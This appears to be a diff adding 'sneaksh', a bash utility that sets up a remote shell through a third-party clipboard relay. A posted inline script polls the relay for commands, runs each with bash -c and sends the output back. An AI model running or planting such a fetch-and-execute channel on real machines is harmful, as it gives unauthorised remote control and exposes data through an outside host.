@@ -1,0 +1,105 @@
+#!/usr/bin/env bash
+
+#> Description of the script
+
+IFS=$'
+	'
+
+usage() {
+    echo "Usage: sneaksh <key>"
+}
+
+if [ $# -ne 1 ]; then
+    usage
+    exit 1
+fi
+
+KEY="$1"
+# Check that key is alphanumeric
+if ! [[ "$KEY" =~ ^[a-zA-Z0-9_-]+$ ]]; then
+    echo "Error: Key must be alphanumeric (letters, numbers, underscores, and hyphens only)."
+    exit 1
+fi
+
+# Make a multi line inline script
+INLINE_SCRIPT=$(
+    cat <<EOF
+#!/usr/bin/env bash
+IFS=$'
+    '
+
+echo "Sending handshake..."
+x=\$(curl -L -s -X POST -d "OK" "https://rclip.feveile-hauge.dk/hs-$KEY?private=true&once=true")
+while true; do
+    echo -e "\e[34m➤ Waiting for command:\e[0m"
+    cmd=\$(curl -L -s "https://rclip.feveile-hauge.dk/next/cmd-$KEY")
+    if [ -z "\$cmd" ]; then
+        echo "No command received, waiting..."
+        continue
+    fi
+    echo -e "\e[33m➤ Command received:\e[0m \$cmd"
+    result=\$(bash -c "\$cmd" 2>&1)
+    echo "\$result"
+    x=\$(curl -L -s -X POST -d "\$result" "https://rclip.feveile-hauge.dk/rsp-$KEY?private=true&once=true")
+    echo -e "\e[32m✔ Result sent.\e[0m"
+done
+EOF
+)
+
+# Check if active session already, then just attach to that.
+rsp_file=$(mktemp)
+curl -L -s --max-time 2 "https://rclip.feveile-hauge.dk/next/rsp-$KEY" >"$rsp_file" &
+rsp_pid=$!
+# Give it a short moment to ensure connection is established
+sleep 0.2
+# Now send the request
+req=$(curl -L -s -X POST -d "ls" "https://rclip.feveile-hauge.dk/cmd-$KEY?private=true&once=true")
+wait $rsp_pid 2>/dev/null
+rsp=$(<"$rsp_file")
+rm -f "$rsp_file"
+
+# If rsp is not empty, then active session exists
+if [ -n "$rsp" ]; then
+    echo -e "🔗 \e[32mActive session found. Attaching to existing session.\e[0m"
+    echo -e "🚀 \e[34m➤Sent command:\e[0m ls"
+    echo "$rsp"
+    echo -e "📩\e[32m Response received.\e[0m"
+    # Now continue to read commands
+else
+    echo -e "🆕 \e[34mNo active session found. Creating new session...\e[0m"
+    curl -L -s -X POST -d "$INLINE_SCRIPT" "https://rclip.feveile-hauge.dk/$KEY?once=true&private=true"
+    echo ""
+
+    # echo "Waiting for handshake..."
+    echo -e "⏳ \e[34mWaiting for handshake...\e[0m"
+    hs_resp=$(curl -L -s "https://rclip.feveile-hauge.dk/next/hs-$KEY")
+    if [ "$hs_resp" != "OK" ]; then
+        echo "Error: Failed to get handshake response."
+        echo "Response was: $hs_resp"
+        exit 1
+    fi
+    echo -e "🤝 \e[32mHandshake successful. You can now enter commands to execute remotely.\e[0m"
+fi
+
+# while true
+# read line from stdin -> send to cmd-$KEY
+# then wait for response from rsp-$KEY and print it
+while true; do
+    if ! read -r line; then
+        break
+    fi
+    echo -e "🚀 \e[34m➤Sent command:\e[0m $line"
+    rsp_file=$(mktemp)
+    curl -L -s --max-time 1 "https://rclip.feveile-hauge.dk/next/rsp-$KEY" >"$rsp_file" &
+    rsp_pid=$!
+    # Give it a short moment to ensure connection is established
+    sleep 0.2
+    # Now send the request
+    req=$(curl -L -s -X POST -d "$line" "https://rclip.feveile-hauge.dk/cmd-$KEY?private=true&once=true")
+    wait $rsp_pid 2>/dev/null
+    rsp=$(<"$rsp_file")
+    rm -f "$rsp_file"
+    echo "$rsp"
+    # Echo in colors response ended:
+    echo -e "📩\e[32m Response received.\e[0m"
+done
